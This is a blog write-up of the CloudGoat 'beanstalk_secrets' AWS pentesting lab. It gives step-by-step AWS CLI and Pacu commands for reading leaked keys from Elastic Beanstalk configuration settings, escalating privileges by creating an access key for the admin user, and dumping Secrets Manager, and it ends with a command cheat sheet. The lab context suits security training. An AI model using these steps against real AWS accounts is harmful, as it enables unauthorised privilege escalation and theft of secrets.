---
title: "Cloudgoat Beanstalk Secrets"
date: 2025-05-20
draft: false
language: en
featured_image: ../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo.png
summary: A walkthrough of the Beanstalk Secrets easy Cloudgoat challenge
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "Beanstalk", "Cloudgoat"]
---
# Introduction & Context

Hey guys! This is a write-up for the beanstalk_secrets challenge from Cloudgoat, available [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/beanstalk_secrets/README.md). The lab gives you a pair of credentials that can use beanstalk only, but from there you'll need to become admin and grab the secrets from the secret manager. This is one of 2 capstone challenges from Tyler's [Intro to AWS Pentesting course](https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting). As a capstone challenge it was unguided and I had to run through it myself. I'll walk through how I did it and a couple ways to improve my methodology (from his walkthrough). I'll also be giving the commands I ran and some of my thought process as I went through the lab. Now onto the lab!

# Setup

If you haven't started cloudgoat yet, start this lab by running `cloudgoat create beanstalk_secrets`. This one does take a while to start up so be patient. Once it's ready, add the keys using `aws configure --profile bean_low`. I set the region to be `us-east-1` and the format as `json`.

Once you got that setup, validate the keys using `aws sts get-caller-identity --profile bean_low`. This should work just fine and you'll find that your username is something like `cg...at_low_priv_user`. Now we can start enumerating!

# Enumerate ourself

To start off, I wanted to see what permissions I had as this low level user. I was told I had access to elastic beanstalk, but no harm in checking if I have anything else useful. The commands I ran for this were:

```bash
pacu
import_keys bean_low
run iam__enum_permissions
run iam__bruteforce_permissions
exit
```

If you run that, you'll find out you have access to basically nothing. The elastic permissions didn't come up for me either. Maybe my version of pacu didn't have that enabled yet? That's unfortunate. We'll need to head into Elastic directly and see if we can make any headway there.

# Enumerate Elastic

## What is Elastic Beanstalk?

Before doing anything into elastic beanstalk, I looked up what it actually is. From their [promotional video](https://www.youtube.com/watch?v=uiM1xzOX8Qg), I learned it's a service to host a web server. That's interesting. Maybe we'll find a website that has some vulnerability we an abuse to escalate our permissions later. I also asked ChatGPT for a couple basic enumeration commands. And for reference, I grabbed the [documentation](https://docs.aws.amazon.com/cli/latest/reference/elasticbeanstalk/).

## Enumerate environment & application

The command chatgpt told me to run was one to describe environments. Well according to [this](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/concepts.html), an environment is a collection of AWS resources running an application version. If I'm a low level user with access to elastic, maybe I have permissions to describe the environments? I tried `aws elasticbeanstalk describe-environments --profile bean_low`. And bingo! Something we could actually run. You should see something like:

```json
{
    "Environments": [
        {
            "EnvironmentName": "cgidwk1c1402at-env",
            "EnvironmentId": "e-bahg3m85ex",
            "ApplicationName": "cgidwk1c1402at-app",
            "SolutionStackName": "64bit Amazon Linux 2023 v4.5.1 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.5.1",
            "EndpointURL": "awseb-e-b-AWSEBLoa-RIRC2YCDS4X1-1221922185.us-east-1.elb.amazonaws.com",
            "CNAME": "cgidwk1c1402at-env.eba-x7cbyr2f.us-east-1.elasticbeanstalk.com",
            "DateCreated": "2025-05-19T22:01:09.730000+00:00",
            "DateUpdated": "2025-05-19T22:04:09.143000+00:00",
            "Status": "Ready",
            "AbortableOperationInProgress": false,
            "Health": "Grey",
            "HealthStatus": "No Data",
            "Tier": {
                "Name": "WebServer",
                "Type": "Standard",
                "Version": "1.0"
            },
            "EnvironmentLinks": [],
            "EnvironmentArn": "arn:aws:elasticbeanstalk:us-east-1:381491899745:environment/cgidwk1c1402at-app/cgidwk1c1402at-env"
        }
    ]
}
```

This seems interesting. We got the name of the application being run and we got an endpoint URL. That url might be the webserver being run? Note this information down. Before we go down that path, let's do a bit more searching.

Now I did a quick scan of the available commands on the documentation page, and one stood out to me. There was an option to describe configuration settings. Well settings might contain sensitive data, like some sort of environment variable or secrets. Settings are useful I'd think. So let's check if we can look at the settings. The command is this (replace the application anem and enviroment name with yours if different).

```bash
aws elasticbeanstalk describe-configuration-settings --profile bean_low --application-name cgidwk1c1402at-app --environment-name cgidwk1c1402at-env
```

And what do you know, there are secrets there! You'll need to scroll a bit, but the keys are available under 2 sections, `aws:cloudformation:template:parameter` and `aws:elasticbeanstalk:application:environment`. Both contain the same keys. But that's our next step! Copy down those keys and we can go to enumerate with those keys

## An automated alternative

When I did the lab, the documentation for Pacu didn't show anything about a module for Elastic (one of the first things I checked), so I assumed there wasn't one. But going through Tyler's course, I find out there was a module! You can run `run elasticbeanstalk__enum --region us-east-1` in pacu and that will find the keys for you! But it's always good to know how to check manually too.

# Enumerate Secondary User

Now after Pacu showed almost nothing useful with the first user, my expectations were low for the second user. Hence I'm going to go through this manually. You can check my other posts for how one could use pacu to automate this if you're interested.

So first thing first, configure the profile & validate credential.

```bash
aws configure --profile elastic_2
#PASS KEYS IN
# region = us-east-1
# output = json
# Validate!
aws sts get-caller-identity --profile elastic_2
{
    "UserId": "AIDAVRUVQNVQ6DCO3CWAF",
    "Account": "381491899745",
    "Arn": "arn:aws:iam::381491899745:user/USERNAME_HERE"
}
```

So I'm going to check if I have any policies attached to me first by running `aws iam list-attached-user-policies --profile elastic_2 --user-name cgidwk1c1402at_secondary_user`.

And we'll get a response showing we have a policy!

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cgidwk1c1402at_secondary_policy",
            "PolicyArn": "arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy"
        }
    ]
}
```

Let's see if I can find anything interesting about the policy by running `aws iam get-policy --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --profile elastic_2`.

You'll see it's tagged with a couple things, but really nothing useful comes out of that. The version Id is `v1` though, let's use that to check what permisions we have. Run `aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --version-id v1 --profile elastic_2`. And you'll see we we something like:

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:CreateAccessKey"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListRoles",
                        "iam:GetRole",
                        "iam:ListPolicies",
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetPolicyVersion",
                        "iam:ListUsers",
                        "iam:GetUser",
                        "iam:ListGroups",
                        "iam:GetGroup",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-05-19T22:00:53+00:00"
    }
}
```

Damn, we got a bunch of IAM permissions. And most importantly, we have the `iam:CreateAccessKey` permission. That, going off the name, would probably mean I can create an access key for any user. So if I can find a user with higher permissions, I could create an access key for them and 'backdoor' myself into them. But we get ahead of ourselves. Let's do a thorough environment enumeration before we go and escalate permisions.

## Enumerate environment with Pacu

Okay, to do this next level of enumeration, I'm going to use Pacu. I'll have it grab my own permissiosn and then check to see all the users & their permissions. Here's what you should do

```bash
pacu
import_keys elastic_2
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
```

Now to read through the results. Let's check who the users are with `data iam Users`. There should be a user with a username like `cg...._admin_user`. That seems interesting. Let's note him down. 

If we check policies, we see there are 3 policies, seems like one for each user. Now one would think the admin has full permissions, but let's just confirm that. Run `aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_admin_user_policy --version-id v1 --profile elastic_2` (make sure to replace the policy arn with yours if different). You'll see the policy allows all actions on all resources. Great! This must be the user we need to transform into to gain our admin access so we can grab the flag from secret manager. 

# Privilege Escalation

So to continue our attack we must become the admin by adding an access key. The documentation I checked for the syntax is [this](https://docs.aws.amazon.com/cli/latest/reference/iam/create-access-key.html). The command is `aws iam create-access-key --user-name cgidwk1c1402at_admin_user --profile elastic_2` (of course replace the admin username and profile with yours!)

You'll get a response that gives you a new access key and secret key so configure a new profile using `aws configure --profile bean_admin`. 

Then verify it using `aws sts get-caller-identity --profile bean_admin` and you'll see that you're admin! 

# Secret Manager

To prove victory we need to grab the secret flag. We can use pacu to grab the secret for us. This is something I wasn't aware when I did the lab, so the instructions are from Tyler's walkthrough.

Open pacu with `pacu` then `import_keys bean_admin` and finally run `run secrets__enum --region us-east-1`. That will get the secrets and store it in a file, it'll tell you where that file is. Then just `cat ~/.local/share/pacu/beanstalk/downloads/secrets/secrets_manager/secrets.txt` and you'll see the flag!

# Conclusion

This was a pretty neat lab where I really had to use some manual techniques to succeed. I had to first look into the elastic beanstalk environment to find unprotected credentials. Then I had to look into the permissions of that new user to find a escalation path. Finally I had to use become the admin and look into the Secret Manager to grab the final flag. 

*Don't forget to destroy your lab to shut down your resources in AWS!*

```bash
cloudgoat destroy beanstalk_secrets
```

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create beanstalk_secrets
aws configure --profile bean_low

#Check Elastic Beanstalk
aws elasticbeanstalk describe-environments --profile bean_low  
aws elasticbeanstalk describe-configuration-settings --profile bean_low --application-name cgidwk1c1402at-app --environment-name cgidwk1c1402at-env

#Enumerate 2nd user
aws configure --profile elastic_2   
aws iam list-attached-user-policies --profile elastic_2 --user-name cgidwk1c1402at_secondary_user
aws iam get-policy --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --profile elastic_2
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --version-id v1 --profile elastic_2

#Enumerate with pacu
pacu
import_keys elastic2
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
data iam Users
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_admin_user_policy --version-id v1 --profile elastic_2   

#Escalate 
aws iam create-access-key --user-name cgidwk1c1402at_admin_user --profile elastic_2   
aws configure --profile bean_admin  
aws sts get-caller-identity --profile bean_admin

#Secret Manager
pacu
import_keys bean_admin
run secrets__enum --region us-east-1
cat ~/.local/share/pacu/beanstalk/downloads/secrets/secrets_manager/secrets.txt
```

```

```
